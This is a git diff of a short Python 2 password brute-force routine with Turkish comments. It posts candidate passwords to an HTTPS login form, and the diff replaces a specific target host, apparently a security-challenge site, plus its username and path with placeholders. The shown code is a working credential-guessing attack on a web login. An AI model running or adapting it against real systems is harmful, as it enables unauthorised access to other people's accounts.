@@ -20,12 +20,12 @@ def dene(sifre,):
 	global bulundu # en püf nokta burda üstteki bi değişgene erişmek için global kulandım onun global bi değişgen olduğunu belirtiyor yoksa yeniden tanımlıyormuş python işte çok yordu beni bu :D 2 saat kadar 
 	if bulundu:
 		return 
-	c = httplib.HTTPSConnection("demirci.siberkuvvet.com") #https bağlantısı adındanda anlaşılacağı üzere
+	c = httplib.HTTPSConnection("site_adresi.com") #https bağlantısı adındanda anlaşılacağı üzere
 	sifre=sifre.replace('\n','') # şifrelerin sonunda enter kodu olan 0a geliyordu onları temizlemek için
 	#print "denenenen: "+sifre
-	params = urllib.urlencode({'kullaniciBilgi': '0xfff000', 'parolaBilgi': sifre }) # giden parametreler
+	params = urllib.urlencode({'kullaniciBilgi': "kullanıcı_adı", 'parolaBilgi': sifre }) # giden parametreler
 	print params
-	c.request("POST", "/bf_afcdf1c574c2f80f52bd70ebd66969c9/",params ,headers) #post ediliş
+	c.request("POST", "/dizin/",params ,headers) #post ediliş
 	response = c.getresponse() #responları çekmek
 	#print response.status, response.reason
 	metin=response.read() #gelen metin
